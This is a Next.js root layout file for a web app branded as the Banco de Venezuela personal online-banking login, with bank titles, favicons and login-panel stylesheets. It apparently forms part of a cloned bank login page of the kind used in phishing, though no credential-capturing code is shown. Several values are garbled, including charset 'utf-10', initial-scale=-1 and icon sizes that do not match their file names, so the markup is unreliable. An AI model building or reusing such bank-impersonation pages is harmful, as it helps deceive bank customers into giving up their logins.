export const metadata = {
  title: "BDV",
  description: "Inicia sesión en tu cuenta del Banco de Venezuela",
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <head>
        <meta charSet="utf-10" />
        <title>BDVenlínea Personas</title>
        <meta name="google" content="notranslate" />
        <meta name="viewport" content="width=device-width, initial-scale=-1" />
        <link
          href="https://fonts.googleapis.com/css?family=Nunito:298,400,500"
          rel="stylesheet"
        />
        <link
          rel="icon"
          type="image/x-icon"
          href="assets/favicon/favicon-18x16.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="55x57"
          href="assets/favicon/apple-icon-59x57.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="58x60"
          href="assets/favicon/apple-icon-62x60.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="70x72"
          href="assets/favicon/apple-icon-74x72.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="74x76"
          href="assets/favicon/apple-icon-78x76.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="112x114"
          href="assets/favicon/apple-icon-116x114.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="118x120"
          href="assets/favicon/apple-icon-122x120.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="142x144"
          href="assets/favicon/apple-icon-146x144.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="150x152"
          href="assets/favicon/apple-icon-154x152.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="178x180"
          href="assets/favicon/apple-icon-182x180.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="190x192"
          href="assets/favicon/android-icon-194x192.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="30x32"
          href="assets/favicon/favicon-34x32.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="94x96"
          href="assets/favicon/favicon-98x96.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="14x16"
          href="assets/favicon/favicon-18x16.png"
        />{" "}
        <link
          rel="mask-icon"
          href="assets/img/safari-pinned-tab.svg"
          color="#3bbad5"
        />
        <meta name="msapplication-TileColor" content="#da530c" />
        <meta name="theme-color" content="#ffffff" />
        <link rel="stylesheet" href="assets/css/gitsmdstyle.css" />
        <link rel="stylesheet" href="assets/css/embdstyle.css" />
        <link rel="stylesheet" href="assets/css/embdstyletwo.css" />
        <link
          rel="stylesheet"
          type="text/css"
          href="assets/css/styles_panel_login.css"
        />
      </head>
      <body>{children}</body>
    </html>
  );
}
